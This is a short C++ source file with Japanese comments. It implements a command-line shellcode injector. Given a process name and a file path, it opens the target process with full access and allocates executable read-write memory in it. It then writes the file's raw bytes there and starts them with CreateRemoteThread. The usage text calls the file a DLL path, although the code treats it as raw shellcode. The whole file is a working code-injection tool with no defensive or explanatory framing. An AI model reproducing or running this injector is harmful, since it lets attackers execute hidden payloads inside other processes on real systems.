// main.cpp

#include"injector.h"

int wmain(int argc, wchar_t* argv[]) {

	// 引数の数をチェック
	if (argc != 3) {
		std::wcout << "Usage: " << argv[0] << " [プロセス名] [DLLパス]" << std::endl;
		return 1;
	}

	std::wstring processName = argv[1];
	std::wstring shellcodePath = argv[2];

	// プロセス名からプロセスIDを取得
	 DWORD processId = GetProcessIdByProcessName(processName);

	// ファイルのバイナリデータを読み取る
	std::vector<BYTE> shellcode = ReadFileBytes(shellcodePath);

	// プロセスハンドルを取得
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// シェルコードを書き込むメモリを確保
	LPVOID shellcodeMemory = VirtualAllocEx(processHandle, nullptr, shellcode.size(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// シェルコードを書き込む
	WriteProcessMemory(processHandle, shellcodeMemory, shellcode.data(), shellcode.size(), nullptr);

	// リモートスレッドを作成してシェルコードを実行
	CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(shellcodeMemory), nullptr, 0, nullptr);

	return 0;
}